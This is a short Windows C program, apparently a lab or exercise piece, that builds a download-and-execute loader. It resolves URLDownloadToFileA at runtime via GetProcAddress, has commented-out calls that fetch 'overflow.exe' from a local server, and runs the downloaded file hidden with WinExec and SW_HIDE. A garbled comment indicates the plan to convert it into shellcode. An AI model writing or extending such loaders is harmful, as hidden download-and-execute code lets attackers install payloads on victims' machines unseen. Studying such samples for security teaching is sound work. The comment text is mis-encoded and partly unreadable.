#include<Windows.h>
#include<urlmon.h>
typedef int (WINAPI* MY_DOWNLOAD_PROC)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);
int main()
{
	HMODULE  hurlmod = LoadLibrary("urlmon.dll");//�ֹ����أ�������ﲻ������
	MY_DOWNLOAD_PROC function_ptr =
		(MY_DOWNLOAD_PROC)GetProcAddress(hurlmod, "URLDownloadToFileA");//�ڵ��������ݺ������ҵ�������ַ
	//function_ptr(NULL, "http://127.0.0.1:8000/overflow.exe", "a.exe", 0, NULL);
	//URLDownloadToFile(NULL,"http://by.cuc.edu.cn", "a.html", 0, NULL);
	WinExec("a.exe", SW_HIDE);
	
	//ת����shellcode
	return 0;
}